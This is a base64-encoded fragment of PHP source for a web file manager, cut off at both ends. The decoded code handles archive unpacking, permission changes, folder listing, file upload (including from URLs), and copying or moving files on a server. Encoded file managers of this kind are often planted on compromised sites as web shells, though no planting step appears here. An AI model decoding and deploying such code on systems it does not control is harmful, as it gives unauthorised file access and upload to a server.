ogICAgICAgICAgICAgICAgICAgICRyZXMgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgICAgICAgICAvL1RPRE86OiBuZWVkIHRvIGhhbmRsZSB0aGUgZXJyb3INCiAgICAgICAgICAgICAgICAkcmVzID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgkcmVzKSB7DQogICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnQXJjaGl2ZSB1bnBhY2tlZCcpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdBcmNoaXZlIG5vdCB1bnBhY2tlZCcpLCAnZXJyb3InKTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICB9DQogICAgJEZNX1BBVEggPSBGTV9QQVRIOw0KICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCn0NCg0KLy8gQ2hhbmdlIFBlcm1zIChub3QgZm9yIFdpbmRvd3MpDQppZiAoaXNzZXQoJF9QT1NUWydjaG1vZCddLCAkX1BPU1RbJ3Rva2VuJ10pICYmICFGTV9SRUFET05MWSAmJiAhRk1fSVNfV0lOKSB7DQoNCiAgICBpZiAoIXZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoIkludmFsaWQgVG9rZW4uIiksICdlcnJvcicpOw0KICAgIH0NCg0KICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KDQogICAgJGZpbGUgPSAkX1BPU1RbJ2NobW9kJ107DQogICAgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlKTsNCiAgICAkZmlsZSA9IHN0cl9yZXBsYWNlKCcvJywgJycsICRmaWxlKTsNCiAgICBpZiAoJGZpbGUgPT0gJycgfHwgKCFpc19maWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpICYmICFpc19kaXIoJHBhdGggLiAnLycgLiAkZmlsZSkpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICAgICAgJEZNX1BBVEggPSBGTV9QQVRIOw0KICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQogICAgfQ0KDQogICAgJG1vZGUgPSAwOw0KICAgIGlmICghZW1wdHkoJF9QT1NUWyd1ciddKSkgew0KICAgICAgICAkbW9kZSB8PSAwNDAwOw0KICAgIH0NCiAgICBpZiAoIWVtcHR5KCRfUE9TVFsndXcnXSkpIHsNCiAgICAgICAgJG1vZGUgfD0gMDIwMDsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3V4J10pKSB7DQogICAgICAgICRtb2RlIHw9IDAxMDA7DQogICAgfQ0KICAgIGlmICghZW1wdHkoJF9QT1NUWydnciddKSkgew0KICAgICAgICAkbW9kZSB8PSAwMDQwOw0KICAgIH0NCiAgICBpZiAoIWVtcHR5KCRfUE9TVFsnZ3cnXSkpIHsNCiAgICAgICAgJG1vZGUgfD0gMDAyMDsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ2d4J10pKSB7DQogICAgICAgICRtb2RlIHw9IDAwMTA7DQogICAgfQ0KICAgIGlmICghZW1wdHkoJF9QT1NUWydvciddKSkgew0KICAgICAgICAkbW9kZSB8PSAwMDA0Ow0KICAgIH0NCiAgICBpZiAoIWVtcHR5KCRfUE9TVFsnb3cnXSkpIHsNCiAgICAgICAgJG1vZGUgfD0gMDAwMjsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ294J10pKSB7DQogICAgICAgICRtb2RlIHw9IDAwMDE7DQogICAgfQ0KDQogICAgaWYgKEBjaG1vZCgkcGF0aCAuICcvJyAuICRmaWxlLCAkbW9kZSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1Blcm1pc3Npb25zIGNoYW5nZWQnKSk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1Blcm1pc3Npb25zIG5vdCBjaGFuZ2VkJyksICdlcnJvcicpOw0KICAgIH0NCg0KICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8qKioqKioqKioqKioqKioqKioqKioqKioqKiogQUNUSU9OUyAqKioqKioqKioqKioqKioqKioqKioqKioqKiovDQoNCi8vIGdldCBjdXJyZW50IHBhdGgNCiRwYXRoID0gRk1fUk9PVF9QQVRIOw0KaWYgKEZNX1BBVEggIT0gJycpIHsNCiAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KfQ0KDQovLyBjaGVjayBwYXRoDQppZiAoIWlzX2RpcigkcGF0aCkpIHsNCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nKTsNCn0NCg0KLy8gZ2V0IHBhcmVudCBmb2xkZXINCiRwYXJlbnQgPSBmbV9nZXRfcGFyZW50X3BhdGgoRk1fUEFUSCk7DQoNCiRvYmplY3RzID0gaXNfcmVhZGFibGUoJHBhdGgpID8gc2NhbmRpcigkcGF0aCkgOiBhcnJheSgpOw0KJGZvbGRlcnMgPSBhcnJheSgpOw0KJGZpbGVzID0gYXJyYXkoKTsNCiRjdXJyZW50X3BhdGggPSBhcnJheV9zbGljZShleHBsb2RlKCIvIiwgJHBhdGgpLCAtMSlbMF07DQppZiAoaXNfYXJyYXkoJG9iamVjdHMpICYmIGZtX2lzX2V4Y2x1ZGVfaXRlbXMoJGN1cnJlbnRfcGF0aCkpIHsNCiAgICBmb3JlYWNoICgkb2JqZWN0cyBhcyAkZmlsZSkgew0KICAgICAgICBpZiAoJGZpbGUgPT0gJy4nIHx8ICRmaWxlID09ICcuLicpIHsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQogICAgICAgIGlmICghRk1fU0hPV19ISURERU4gJiYgc3Vic3RyKCRmaWxlLCAwLCAxKSA9PT0gJy4nKSB7DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KICAgICAgICAkbmV3X3BhdGggPSAkcGF0aCAuICcvJyAuICRmaWxlOw0KICAgICAgICBpZiAoQGlzX2ZpbGUoJG5ld19wYXRoKSAmJiBmbV9pc19leGNsdWRlX2l0ZW1zKCRmaWxlKSkgew0KICAgICAgICAgICAgJGZpbGVzW10gPSAkZmlsZTsNCiAgICAgICAgfSBlbHNlaWYgKEBpc19kaXIoJG5ld19wYXRoKSAmJiAkZmlsZSAhPSAnLicgJiYgJGZpbGUgIT0gJy4uJyAmJiBmbV9pc19leGNsdWRlX2l0ZW1zKCRmaWxlKSkgew0KICAgICAgICAgICAgJGZvbGRlcnNbXSA9ICRmaWxlOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQppZiAoIWVtcHR5KCRmaWxlcykpIHsNCiAgICBuYXRjYXNlc29ydCgkZmlsZXMpOw0KfQ0KaWYgKCFlbXB0eSgkZm9sZGVycykpIHsNCiAgICBuYXRjYXNlc29ydCgkZm9sZGVycyk7DQp9DQoNCi8vIHVwbG9hZCBmb3JtDQppZiAoaXNzZXQoJF9HRVRbJ3VwbG9hZCddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgNCiAgICAvL2dldCB0aGUgYWxsb3dlZCBmaWxlIGV4dGVuc2lvbnMNCiAgICBmdW5jdGlvbiBnZXRVcGxvYWRFeHQoKQ0KICAgIHsNCiAgICAgICAgJGV4dEFyciA9IGV4cGxvZGUoJywnLCBGTV9VUExPQURfRVhURU5TSU9OKTsNCiAgICAgICAgaWYgKEZNX1VQTE9BRF9FWFRFTlNJT04gJiYgJGV4dEFycikgew0KICAgICAgICAgICAgYXJyYXlfd2FsaygkZXh0QXJyLCBmdW5jdGlvbiAoJiR4KSB7DQogICAgICAgICAgICAgICAgJHggPSAiLiR4IjsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgcmV0dXJuIGltcGxvZGUoJywnLCAkZXh0QXJyKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJyc7DQogICAgfQ0KICAgID8+DQogICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2Nzcy1kcm9wem9uZScpOyA/Pg0KICAgIDxkaXYgY2xhc3M9InBhdGgiPg0KDQogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiBmbS11cGxvYWQtd3JhcHBlciIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2IG5hdi10YWJzIGNhcmQtaGVhZGVyLXRhYnMiPg0KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiNmaWxlVXBsb2FkZXIiIGRhdGEtdGFyZ2V0PSIjZmlsZVVwbG9hZGVyIj48aSBjbGFzcz0iZmEgZmEtYXJyb3ctY2lyY2xlLW8tdXAiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VwbG9hZGluZ0ZpbGVzJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSIjdXJsVXBsb2FkZXIiIGNsYXNzPSJqcy11cmwtdXBsb2FkIiBkYXRhLXRhcmdldD0iI3VybFVwbG9hZGVyIj48aSBjbGFzcz0iZmEgZmEtbGluayI+PC9pPiA8P3BocCBlY2hvIGxuZygnVXBsb2FkIGZyb20gVVJMJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgPC91bD4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICA8cCBjbGFzcz0iY2FyZC10ZXh0Ij4NCiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP3A9PD9waHAgZWNobyBGTV9QQVRIID8+IiBjbGFzcz0iZmxvYXQtcmlnaHQiPjxpIGNsYXNzPSJmYSBmYS1jaGV2cm9uLWNpcmNsZS1sZWZ0IGdvLWJhY2siPjwvaT4gPD9waHAgZWNobyBsbmcoJ0JhY2snKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgPHN0cm9uZz48P3BocCBlY2hvIGxuZygnRGVzdGluYXRpb25Gb2xkZXInKSA/Pjwvc3Ryb25nPjogPD9waHAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oRk1fUEFUSCkpID8+DQogICAgICAgICAgICAgICAgPC9wPg0KDQogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoRk1fU0VMRl9VUkwpIC4gJz9wPScgLiBmbV9lbmMoRk1fUEFUSCkgPz4iIGNsYXNzPSJkcm9wem9uZSBjYXJkLXRhYnMtY29udGFpbmVyIiBpZD0iZmlsZVVwbG9hZGVyIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZnVsbHBhdGgiIGlkPSJmdWxscGF0aCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSI8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmYWxsYmFjayI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgbmFtZT0iZmlsZSIgdHlwZT0iZmlsZSIgbXVsdGlwbGUgLz4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9mb3JtPg0KDQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idXBsb2FkLXVybC13cmFwcGVyIGNhcmQtdGFicy1jb250YWluZXIgaGlkZGVuIiBpZD0idXJsVXBsb2FkZXIiPg0KICAgICAgICAgICAgICAgICAgICA8Zm9ybSBpZD0ianMtZm9ybS11cmwtdXBsb2FkIiBjbGFzcz0icm93IHJvdy1jb2xzLWxnLWF1dG8gZy0zIGFsaWduLWl0ZW1zLWNlbnRlciIgb25zdWJtaXQ9InJldHVybiB1cGxvYWRfZnJvbV91cmwodGhpcyk7IiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSJ1cGxvYWQiIGFyaWEtbGFiZWw9ImhpZGRlbiIgYXJpYS1oaWRkZW49InRydWUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InVybCIgcGxhY2Vob2xkZXI9IlVSTCIgbmFtZT0idXBsb2FkdXJsIiByZXF1aXJlZCBjbGFzcz0iZm9ybS1jb250cm9sIiBzdHlsZT0id2lkdGg6IDgwJSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSBtcy0zIj48P3BocCBlY2hvIGxuZygnVXBsb2FkJykgPz48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imxkcy1mYWNlYm9vayI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJqcy11cmwtdXBsb2FkX19saXN0IiBjbGFzcz0iY29sLTkgbXQtMyI+PC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWRyb3B6b25lJyk7ID8+DQogICAgPHNjcmlwdD4NCiAgICAgICAgRHJvcHpvbmUub3B0aW9ucy5maWxlVXBsb2FkZXIgPSB7DQogICAgICAgICAgICBjaHVua2luZzogdHJ1ZSwNCiAgICAgICAgICAgIGNodW5rU2l6ZTogPD9waHAgZWNobyBVUExPQURfQ0hVTktfU0laRTsgPz4sDQogICAgICAgICAgICBmb3JjZUNodW5raW5nOiB0cnVlLA0KICAgICAgICAgICAgcmV0cnlDaHVua3M6IHRydWUsDQogICAgICAgICAgICByZXRyeUNodW5rc0xpbWl0OiAzLA0KICAgICAgICAgICAgcGFyYWxsZWxVcGxvYWRzOiAxLA0KICAgICAgICAgICAgcGFyYWxsZWxDaHVua1VwbG9hZHM6IGZhbHNlLA0KICAgICAgICAgICAgdGltZW91dDogMTIwMDAwLA0KICAgICAgICAgICAgbWF4RmlsZXNpemU6ICI8P3BocCBlY2hvIE1BWF9VUExPQURfU0laRTsgPz4iLA0KICAgICAgICAgICAgYWNjZXB0ZWRGaWxlczogIjw/cGhwIGVjaG8gZ2V0VXBsb2FkRXh0KCkgPz4iLA0KICAgICAgICAgICAgaW5pdDogZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgdGhpcy5vbigic2VuZGluZyIsIGZ1bmN0aW9uKGZpbGUsIHhociwgZm9ybURhdGEpIHsNCiAgICAgICAgICAgICAgICAgICAgbGV0IF9wYXRoID0gKGZpbGUuZnVsbFBhdGgpID8gZmlsZS5mdWxsUGF0aCA6IGZpbGUubmFtZTsNCiAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZ1bGxwYXRoIikudmFsdWUgPSBfcGF0aDsNCiAgICAgICAgICAgICAgICAgICAgeGhyLm9udGltZW91dCA9IChmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KCdFcnJvcjogU2VydmVyIFRpbWVvdXQnKTsNCiAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgfSkub24oInN1Y2Nlc3MiLCBmdW5jdGlvbihyZXMpIHsNCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBfcmVzcG9uc2UgPSBKU09OLnBhcnNlKHJlcy54aHIucmVzcG9uc2UpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoX3Jlc3BvbnNlLnN0YXR1cyA9PSAiZXJyb3IiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoX3Jlc3BvbnNlLmluZm8pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0b2FzdCgiRXJyb3I6IEludmFsaWQgSlNPTiByZXNwb25zZSIpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSkub24oImVycm9yIiwgZnVuY3Rpb24oZmlsZSwgcmVzcG9uc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgdG9hc3QocmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgPC9zY3JpcHQ+DQo8P3BocA0KICAgIGZtX3Nob3dfZm9vdGVyKCk7DQogICAgZXhpdDsNCn0NCg0KLy8gY29weSBmb3JtIFBPU1QNCmlmIChpc3NldCgkX1BPU1RbJ2NvcHknXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgJGNvcHlfZmlsZXMgPSBpc3NldCgkX1BPU1RbJ2ZpbGUnXSkgPyAkX1BPU1RbJ2ZpbGUnXSA6IG51bGw7DQogICAgaWYgKCFpc19hcnJheSgkY29weV9maWxlcykgfHwgZW1wdHkoJGNvcHlfZmlsZXMpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdOb3RoaW5nIHNlbGVjdGVkJyksICdhbGVydCcpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQoNCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgNCj8+DQogICAgPGRpdiBjbGFzcz0icGF0aCI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQiIGRhdGEtYnMtdGhlbWU9Ijw/cGhwIGVjaG8gRk1fVEhFTUU7ID8+Ij4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj4NCiAgICAgICAgICAgICAgICA8aDY+PD9waHAgZWNobyBsbmcoJ0NvcHlpbmcnKSA/PjwvaDY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+DQogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InAiIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYyhGTV9QQVRIKSA/PiI+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbmlzaCIgdmFsdWU9IjEiPg0KICAgICAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkY29weV9maWxlcyBhcyAkY2YpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGVbXSIgdmFsdWU9IicgLiBmbV9lbmMoJGNmKSAuICciPicgLiBQSFBfRU9MOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJicmVhay13b3JkIj48c3Ryb25nPjw/cGhwIGVjaG8gbG5nKCdGaWxlcycpID8+PC9zdHJvbmc+OiA8Yj48P3BocCBlY2hvIGltcGxvZGUoJzwvYj4sIDxiPicsICRjb3B5X2ZpbGVzKSA/PjwvYj48L3A+DQogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJicmVhay13b3JkIj48c3Ryb25nPjw/cGhwIGVjaG8gbG5nKCdTb3VyY2VGb2xkZXInKSA/Pjwvc3Ryb25nPjogPD9waHAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oRk1fUk9PVF9QQVRIIC4gJy8nIC4gRk1fUEFUSCkpID8+PGJyPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iaW5wX2NvcHlfdG8iPjxzdHJvbmc+PD9waHAgZWNobyBsbmcoJ0Rlc3RpbmF0aW9uRm9sZGVyJykgPz48L3N0cm9uZz46PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gRk1fUk9PVF9QQVRIID8+LzxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb3B5X3RvIiBpZD0iaW5wX2NvcHlfdG8iIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYyhGTV9QQVRIKSA/PiI+DQogICAgICAgICAgICAgICAgICAgIDwvcD4NCiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9ImN1c3RvbS1jaGVja2JveCBjdXN0b20tY29udHJvbCI+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJtb3ZlIiB2YWx1ZT0iMSIgaWQ9ImpzLW1vdmUtZmlsZXMiIGNsYXNzPSJjdXN0b20tY29udHJvbC1pbnB1dCI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1tb3ZlLWZpbGVzIiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwgbXMtMiI+PD9waHAgZWNobyBsbmcoJ01vdmUnKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgIDwvcD4NCiAgICAgICAgICAgICAgICAgICAgPHA+DQogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1kYW5nZXIiPjxpIGNsYXNzPSJmYSBmYS10aW1lcy1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NhbmNlbCcpID8+PC9hPjwvYj4mbmJzcDsNCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIj48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDb3B5JykgPz48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgPC9wPg0KICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCjw/cGhwDQogICAgZm1fc2hvd19mb290ZXIoKTsNCiAgICBleGl0Ow0KfQ0KDQovLyBjb3B5IGZvcm0NCmlmIChpc3NldCgkX0dFVFsnY29weSddKSAmJiAhaXNzZXQoJF9HRVRbJ2ZpbmlzaCddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICAkY29weSA9ICRfR0VUWydjb3B5J107DQogICAgJGNvcHkgPSBmbV9jbGVhbl9wYXRoKCRjb3B5KTsNCiAgICBpZiAoJGNvcHkgPT0gJycgfHwgIWZpbGVfZXhpc3RzKEZNX1JPT1RfUEFUSCAuICcvJyAuICRjb3B5KSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnRmlsZSBub3QgZm91bmQnKSwgJ2Vycm9yJyk7DQogICAgICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KICAgIH0NCg0KICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KPz4NCiAgICA8ZGl2IGNsYXNzPSJwYXRoIj4NCiAgICAgICAgPHA+PGI+Q29weWluZzwvYj48L3A+DQogICAgICAgIDxwIGNsYXNzPSJicmVhay13b3JkIj4NCiAgICAgICAgICAgIDxzdHJvbmc+U291cmNlIHBhdGg6PC9zdHJvbmc+IDw/cGhwIGVjaG8gZm1fZW5jKGZtX2NvbnZlcnRfd2luKEZNX1JPT1RfUEFUSCAuICcvJyAuICRjb3B5KSkgPz48YnI+DQogICAgICAgICAgICA8c3Ryb25nPkRlc3RpbmF0aW9uIGZvbGRlcjo8L3N0cm9uZz4gPD9waHAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oRk1fUk9PVF9QQVRIIC4gJy8nIC4gRk1fUEFUSCkpID8+DQogICAgICAgIDwvcD4NCiAgICAgICAgPHA+DQogICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7Y29weT08P3BocCBlY2hvIHVybGVuY29kZSgkY29weSkgPz4mYW1wO2ZpbmlzaD0xIj48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IENvcHk8L2E+PC9iPiAmbmJzcDsNCiAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtjb3B5PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjb3B5KSA/PiZhbXA7ZmluaXNoPTEmYW1wO21vdmU9MSI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiBNb3ZlPC9hPjwvYj4gJm5ic3A7DQogICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiIgY2xhc3M9InRleHQtZGFuZ2VyIj48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IENhbmNlbDwvYT48L2I+DQogICAgICAgIDwvcD4NCiAgICAgICAgPHA+PGk+PD9waHAgZWNobyBsbmcoJ1NlbGVjdCBmb2xkZXInKSA/PjwvaT48L3A+DQogICAgICAgIDx1bCBjbGFzcz0iZm9sZGVycyBicmVhay13b3JkIj4NCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICBpZiAoJHBhcmVudCAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5